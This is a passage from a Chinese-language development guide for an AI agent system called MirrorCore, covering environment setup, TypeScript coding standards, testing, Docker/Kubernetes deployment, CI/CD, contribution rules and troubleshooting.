    await this.validateScriptSecurity(script);
    
    return script;
  }
}
```

---

## 🔧 开发环境配置

### 环境要求

#### 系统要求
- **操作系统**: Windows 10+, macOS 10.15+, Ubuntu 18.04+
- **Node.js**: 18.0.0 或更高版本
- **内存**: 最少 8GB RAM (推荐 16GB+)
- **存储**: 最少 10GB 可用空间
- **网络**: 稳定的互联网连接 (用于AI服务调用)

#### 必需软件
```bash
# Node.js 和 npm
node --version  # >= 18.0.0
npm --version   # >= 8.0.0

# Git
git --version   # >= 2.30.0

# Docker (可选，用于容器化开发)
docker --version   # >= 20.10.0
docker-compose --version  # >= 1.29.0
```

### 开发环境搭建

#### 1. 克隆项目

```bash
# 克隆主仓库
git clone https://github.com/your-org/mirrorcore.git
cd mirrorcore

# 安装依赖
npm install

# 安装开发工具
npm install -g typescript ts-node nodemon
```

#### 2. 环境配置

```bash
# 复制环境配置文件
cp .env.example .env.development

# 编辑配置文件
nano .env.development
```

**环境变量配置**:
```env
# 应用配置
NODE_ENV=development
PORT=3000
LOG_LEVEL=debug

# AI服务配置
OPENAI_API_KEY=your_openai_api_key
ANTHROPIC_API_KEY=your_anthropic_api_key
AI_SERVICE_PROVIDER=openai  # openai | anthropic | custom

# 数据库配置
STORAGE_TYPE=file
STORAGE_PATH=./data/storage

# 安全配置
JWT_SECRET=your_jwt_secret_key
ENCRYPTION_KEY=your_encryption_key

# 文件系统配置
WORKSPACE_ROOT=/path/to/workspace
MAX_FILE_SIZE=10485760  # 10MB
ALLOWED_FILE_TYPES=.js,.ts,.jsx,.tsx,.py,.java,.cpp,.go,.rs

# 外部服务配置
GITHUB_TOKEN=your_github_token
AWS_ACCESS_KEY_ID=your_aws_access_key
AWS_SECRET_ACCESS_KEY=your_aws_secret_key
```

#### 3. 数据存储设置

```bash
# 创建数据目录
mkdir -p data

# 初始化存储
npm run storage:init
```

#### 4. 启动开发服务器

```bash
# 启动后端服务
npm run dev:backend

# 启动前端开发服务器 (新终端)
npm run dev:frontend

# 启动桌面应用 (新终端)
npm run dev:desktop
```

### IDE配置

#### VS Code 推荐配置

**扩展插件**:
```json
{
  "recommendations": [
    "ms-vscode.vscode-typescript-next",
    "esbenp.prettier-vscode",
    "ms-vscode.vscode-eslint",
    "bradlc.vscode-tailwindcss",
    "ms-vscode.vscode-jest",
    "ms-playwright.playwright",
    "ms-vscode.vscode-json"
  ]
}
```

**工作区设置**:
```json
{
  "typescript.preferences.importModuleSpecifier": "relative",
  "editor.formatOnSave": true,
  "editor.codeActionsOnSave": {
    "source.fixAll.eslint": true,
    "source.organizeImports": true
  },
  "files.exclude": {
    "**/node_modules": true,
    "**/dist": true,
    "**/.next": true
  }
}
```

---

## 📏 代码规范

### TypeScript 编码规范

#### 1. 命名约定

```typescript
// 接口使用 PascalCase，以 I 开头
interface IUserService {
  createUser(userData: CreateUserRequest): Promise<User>;
}

// 类使用 PascalCase
class UserService implements IUserService {
  private readonly userRepository: IUserRepository;
  
  constructor(userRepository: IUserRepository) {
    this.userRepository = userRepository;
  }
}

// 常量使用 SCREAMING_SNAKE_CASE
const MAX_RETRY_ATTEMPTS = 3;
const DEFAULT_TIMEOUT = 5000;

// 枚举使用 PascalCase
enum TaskStatus {
  Pending = 'pending',
  InProgress = 'in_progress',
  Completed = 'completed',
  Failed = 'failed'
}

// 函数和变量使用 camelCase
const calculateEstimatedTime = (tasks: Task[]): number => {
  return tasks.reduce((total, task) => total + task.estimatedHours, 0);
};
```

#### 2. 类型定义

```typescript
// 使用严格的类型定义
interface CreateTaskRequest {
  readonly title: string;
  readonly description?: string;
  readonly priority: TaskPriority;
  readonly assigneeId?: string;
  readonly dueDate?: Date;
  readonly tags: readonly string[];
}

// 使用联合类型和字面量类型
type TaskPriority = 'low' | 'medium' | 'high' | 'urgent';
type HttpMethod = 'GET' | 'POST' | 'PUT' | 'DELETE' | 'PATCH';

// 使用泛型提高代码复用性
interface Repository<T, K = string> {
  findById(id: K): Promise<T | null>;
  create(entity: Omit<T, 'id'>): Promise<T>;
  update(id: K, updates: Partial<T>): Promise<T>;
  delete(id: K): Promise<void>;
}

// 使用条件类型
type ApiResponse<T> = T extends string 
  ? { message: T } 
  : { data: T; message: string };
```

#### 3. 错误处理

```typescript
// 自定义错误类
class ValidationError extends Error {
  constructor(
    message: string,
    public readonly field: string,
    public readonly code: string = 'VALIDATION_ERROR'
  ) {
    super(message);
    this.name = 'ValidationError';
  }
}

// 结果类型模式
type Result<T, E = Error> = 
  | { success: true; data: T }
  | { success: false; error: E };

// 使用 Result 类型的函数
async function validateUser(userData: unknown): Promise<Result<User, ValidationError>> {
  try {
    const user = await userSchema.parseAsync(userData);
    return { success: true, data: user };
  } catch (error) {
    return { 
      success: false, 
      error: new ValidationError('Invalid user data', 'userData') 
    };
  }
}
```

### ESLint 配置

```json
{
  "extends": [
    "@typescript-eslint/recommended",
    "@typescript-eslint/recommended-requiring-type-checking",
    "prettier"
  ],
  "rules": {
    "@typescript-eslint/no-unused-vars": "error",
    "@typescript-eslint/explicit-function-return-type": "warn",
    "@typescript-eslint/no-explicit-any": "warn",
    "@typescript-eslint/prefer-readonly": "error",
    "prefer-const": "error",
    "no-var": "error"
  }
}
```

### Prettier 配置

```json
{
  "semi": true,
  "trailingComma": "es5",
  "singleQuote": true,
  "printWidth": 100,
  "tabWidth": 2,
  "useTabs": false
}
```

---

## 🧪 测试策略

### 测试金字塔

```
    ┌─────────────────┐
    │   E2E Tests     │  <- 少量，关键用户流程
    │     (10%)       │
    ├─────────────────┤
    │ Integration     │  <- 中等数量，模块间交互
    │   Tests (30%)   │
    ├─────────────────┤
    │  Unit Tests     │  <- 大量，单个函数/类
    │    (60%)        │
    └─────────────────┘
```

### 单元测试

#### Jest 配置

```typescript
// jest.config.js
module.exports = {
  preset: 'ts-jest',
  testEnvironment: 'node',
  roots: ['<rootDir>/src', '<rootDir>/tests'],
  testMatch: ['**/__tests__/**/*.test.ts', '**/?(*.)+(spec|test).ts'],
  collectCoverageFrom: [
    'src/**/*.ts',
    '!src/**/*.d.ts',
    '!src/types/**/*',
  ],
  coverageThreshold: {
    global: {
      branches: 80,
      functions: 80,
      lines: 80,
      statements: 80,
    },
  },
};
```

#### 测试示例

```typescript
// tests/modules/code-analysis.test.ts
describe('CodeAnalysisModule', () => {
  let module: CodeAnalysisModule;
  let mockFileSystem: jest.Mocked<IFileSystem>;
  
  beforeEach(() => {
    mockFileSystem = createMockFileSystem();
    module = new CodeAnalysisModule(mockFileSystem);
  });
  
  describe('analyzeProject', () => {
    it('should analyze project structure correctly', async () => {
      // Arrange
      const projectPath = '/test/project';
      mockFileSystem.readDirectory.mockResolvedValue([
        'src/index.ts',
        'package.json',
        'README.md'
      ]);
      
      // Act
      const result = await module.analyzeProject(projectPath, {
        depth: 'shallow'
      });
      
      // Assert
      expect(result.structure.totalFiles).toBe(3);
      expect(result.structure.languages).toContain('typescript');
      expect(mockFileSystem.readDirectory).toHaveBeenCalledWith(projectPath);
    });
    
    it('should handle analysis errors gracefully', async () => {
      // Arrange
      const projectPath = '/invalid/path';
      mockFileSystem.readDirectory.mockRejectedValue(
        new Error('Directory not found')
      );
      
      // Act & Assert
      await expect(module.analyzeProject(projectPath, {}))
        .rejects.toThrow('Directory not found');
    });
  });
});
```

### 集成测试

```typescript
// tests/integration/api.test.ts
describe('API Integration Tests', () => {
  let app: Application;
  let testStorage: IContextStorage;
  
  beforeAll(async () => {
    testStorage = await createTestStorage();
    app = createApp({ storage: testStorage });
  });
  
  afterAll(async () => {
    await testStorage.cleanup();
  });
  
  describe('POST /api/chat/message', () => {
    it('should process chat message and return response', async () => {
      const response = await request(app)
        .post('/api/chat/message')
        .send({
          message: '请帮我分析这个项目',
          context: { projectPath: '/test/project' }
        })
        .expect(200);
      
      expect(response.body).toHaveProperty('response');
      expect(response.body).toHaveProperty('actions');
      expect(response.body.actions).toBeInstanceOf(Array);
    });
  });
});
```

### E2E 测试

```typescript
// tests/e2e/chat-workflow.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Chat Workflow', () => {
  test('should complete full chat interaction', async ({ page }) => {
    // 导航到应用
    await page.goto('http://localhost:3000');
    
    // 等待应用加载
    await expect(page.locator('[data-testid="chat-container"]')).toBeVisible();
    
    // 发送消息
    const messageInput = page.locator('[data-testid="message-input"]');
    await messageInput.fill('请帮我创建一个React组件');
    await page.click('[data-testid="send-button"]');
    
    // 验证消息发送
    await expect(page.locator('.user-message').last()).toContainText('请帮我创建一个React组件');
    
    // 等待AI响应
    await expect(page.locator('.assistant-message').last()).toBeVisible({ timeout: 10000 });
    
    // 验证响应内容
    const response = page.locator('.assistant-message').last();
    await expect(response).toContainText('React组件');
  });
});
```

---

## 🚀 部署流程

### 开发环境部署

```bash
# 构建项目
npm run build

# 运行测试
npm run test

# 启动开发服务器
npm run dev
```

### 生产环境部署

#### Docker 部署

```dockerfile
# Dockerfile
FROM node:18-alpine AS builder

WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

COPY . .
RUN npm run build

FROM node:18-alpine AS runtime

WORKDIR /app
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app/package.json ./

EXPOSE 3000
CMD ["node", "dist/index.js"]
```

```yaml
# docker-compose.prod.yml
version: '3.8'

services:
  app:
    build: .
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=production
      - STORAGE_TYPE=file
      - STORAGE_PATH=/app/data
    volumes:
      - app_data:/app/data
    restart: unless-stopped

volumes:
  app_data:
```

#### Kubernetes 部署

```yaml
# k8s/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mirrorcore-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: mirrorcore-app
  template:
    metadata:
      labels:
        app: mirrorcore-app
    spec:
      containers:
      - name: app
        image: mirrorcore:latest
        ports:
        - containerPort: 3000
        env:
        - name: NODE_ENV
          value: "production"
        - name: STORAGE_TYPE
          value: "file"
        - name: STORAGE_PATH
          value: "/app/data"
        resources:
          requests:
            memory: "512Mi"
            cpu: "250m"
          limits:
            memory: "1Gi"
            cpu: "500m"
        livenessProbe:
          httpGet:
            path: /health
            port: 3000
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /ready
            port: 3000
          initialDelaySeconds: 5
          periodSeconds: 5
```

### CI/CD 流水线

```yaml
# .github/workflows/ci-cd.yml
name: CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run linting
        run: npm run lint
      
      - name: Run tests
        run: npm run test:coverage
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3

  build:
    needs: test
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@v3
      
      - name: Build Docker image
        run: docker build -t mirrorcore:${{ github.sha }} .
      
      - name: Push to registry
        run: |
          echo ${{ secrets.DOCKER_PASSWORD }} | docker login -u ${{ secrets.DOCKER_USERNAME }} --password-stdin
          docker push mirrorcore:${{ github.sha }}

  deploy:
    needs: build
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - name: Deploy to production
        run: |
          # 部署脚本
          kubectl set image deployment/mirrorcore-app app=mirrorcore:${{ github.sha }}
```

---

## 🤝 贡献指南

### 贡献流程

1. **Fork 项目**
   ```bash
   # Fork 项目到你的 GitHub 账户
   # 克隆你的 fork
   git clone https://github.com/your-username/mirrorcore.git
   cd mirrorcore
   
   # 添加上游仓库
   git remote add upstream https://github.com/original-org/mirrorcore.git
   ```

2. **创建功能分支**
   ```bash
   # 从 develop 分支创建新分支
   git checkout develop
   git pull upstream develop
   git checkout -b feature/your-feature-name
   ```

3. **开发和测试**
   ```bash
   # 进行开发
   # 运行测试
   npm run test
   
   # 运行代码检查
   npm run lint
   
   # 提交更改
   git add .
   git commit -m "feat: add new feature description"
   ```

4. **提交 Pull Request**
   ```bash
   # 推送分支
   git push origin feature/your-feature-name
   
   # 在 GitHub 上创建 Pull Request
   ```

### 提交信息规范

使用 [Conventional Commits](https://www.conventionalcommits.org/) 规范：

```
<type>[optional scope]: <description>

[optional body]

[optional footer(s)]
```

**类型说明**:
- `feat`: 新功能
- `fix`: 错误修复
- `docs`: 文档更新
- `style`: 代码格式化
- `refactor`: 代码重构
- `test`: 测试相关
- `chore`: 构建过程或辅助工具的变动

**示例**:
```
feat(code-analysis): add TypeScript support for code generation

- Add TypeScript AST parsing
- Implement type-aware code generation
- Add comprehensive test coverage

Closes #123
```

### 代码审查清单

#### 功能性
- [ ] 功能是否按预期工作
- [ ] 是否有适当的错误处理
- [ ] 是否有足够的测试覆盖
- [ ] 是否考虑了边界情况

#### 代码质量
- [ ] 代码是否遵循项目规范
- [ ] 是否有适当的注释和文档
- [ ] 是否有代码重复
- [ ] 是否使用了合适的设计模式

#### 性能
- [ ] 是否有性能问题
- [ ] 是否有内存泄漏风险
- [ ] 是否有不必要的计算

#### 安全性
- [ ] 是否有安全漏洞
- [ ] 输入验证是否充分
- [ ] 是否正确处理敏感数据

---

## 🔍 故障排除

### 常见问题

#### 1. 依赖安装失败

**问题**: `npm install` 失败
```bash
npm ERR! peer dep missing: typescript@>=4.5.0
```

**解决方案**:
```bash
# 清理缓存
npm cache clean --force

# 删除 node_modules 和 package-lock.json
rm -rf node_modules package-lock.json

# 重新安装
npm install

# 如果仍然失败，尝试使用 yarn
yarn install
```

#### 2. TypeScript 编译错误

**问题**: 类型检查失败
```
error TS2345: Argument of type 'string' is not assignable to parameter of type 'number'
```

**解决方案**:
```bash
# 检查 TypeScript 配置
npx tsc --showConfig

# 运行类型检查
npx tsc --noEmit

# 更新类型定义
npm update @types/node
```

#### 3. 数据库连接问题

**问题**: 无法连接到数据库
```
Error: connect ECONNREFUSED 127.0.0.1:5432
```

**解决方案**:
```bash
# 检查存储服务状态
ls -la ./data/

# 检查存储配置
echo $STORAGE_TYPE
echo $STORAGE_PATH
```

#### 4. AI 服务调用失败

**问题**: OpenAI API 调用失败
```
Error: Request failed with status code 401
```

**解决方案**:
```bash
# 检查 API 密钥
echo $OPENAI_API_KEY

# 验证 API 密钥有效性
curl -H "Authorization: Bearer $OPENAI_API_KEY" \
     https://api.openai.com/v1/models

# 检查配额和限制
```

### 调试技巧

#### 1. 启用详细日志

```typescript
// 在开发环境中启用调试日志
process.env.LOG_LEVEL = 'debug';

// 使用结构化日志
logger.debug('Processing request', {
  userId: req.user.id,
  action: 'code_analysis',
  projectPath: req.body.projectPath
});
```

#### 2. 使用调试器

```bash
# 启动调试模式
npm run dev:debug

# 或者使用 VS Code 调试配置
```

```json
// .vscode/launch.json
{
  "version": "0.2.0",
  "configurations": [
    {
      "name": "Debug Backend",
      "type": "node",
      "request": "launch",
      "program": "${workspaceFolder}/src/index.ts",
      "outFiles": ["${workspaceFolder}/dist/**/*.js"],
      "runtimeArgs": ["-r", "ts-node/register"],
      "env": {
        "NODE_ENV": "development"
      }
    }
  ]
}
```

#### 3. 性能分析

```bash
# 使用 clinic.js 进行性能分析
npm install -g clinic
clinic doctor -- node dist/index.js

# 使用 0x 进行火焰图分析
npm install -g 0x
0x -- node dist/index.js
```

### 监控和告警

#### 健康检查端点

```typescript
// src/routes/health.ts
app.get('/health', async (req, res) => {
  const health = {
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    services: {
      storage: await checkStorageHealth(),
      aiService: await checkAIServiceHealth()
    }
  };
  
  const isHealthy = Object.values(health.services).every(service => service.status === 'ok');
  
  res.status(isHealthy ? 200 : 503).json(health);
});
```

#### 日志聚合

```yaml
# docker-compose.monitoring.yml
version: '3.8'

services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.5.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
    ports:
      - "9200:9200"

  logstash:
    image: docker.elastic.co/logstash/logstash:8.5.0
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
    depends_on:
      - elasticsearch

  kibana:
    image: docker.elastic.co/kibana/kibana:8.5.0
    ports:
      - "5601:5601"
    depends_on:
      - elasticsearch
```

---

## 📚 参考资源

### 官方文档
- [Node.js 官方文档](https://nodejs.org/docs/)
- [TypeScript 官方文档](https://www.typescriptlang.org/docs/)
- [React 官方文档](https://react.dev/)
- [Electron 官方文档](https://www.electronjs.org/docs/)

### 最佳实践
- [Node.js 最佳实践](https://github.com/goldbergyoni/nodebestpractices)
- [TypeScript 最佳实践](https://typescript-eslint.io/rules/)
- [React 最佳实践](https://react.dev/learn/thinking-in-react)

### 工具和库
- [Jest 测试框架](https://jestjs.io/docs/getting-started)
- [Playwright E2E 测试](https://playwright.dev/docs/intro)
- [ESLint 代码检查](https://eslint.org/docs/user-guide/)
- [Prettier 代码格式化](https://prettier.io/docs/en/index.html)

---

<div align="center">

**🛠️ MirrorCore AI智能体系统开发指南**

Made with ❤️ by MirrorCore AI Agent Development Team

</div>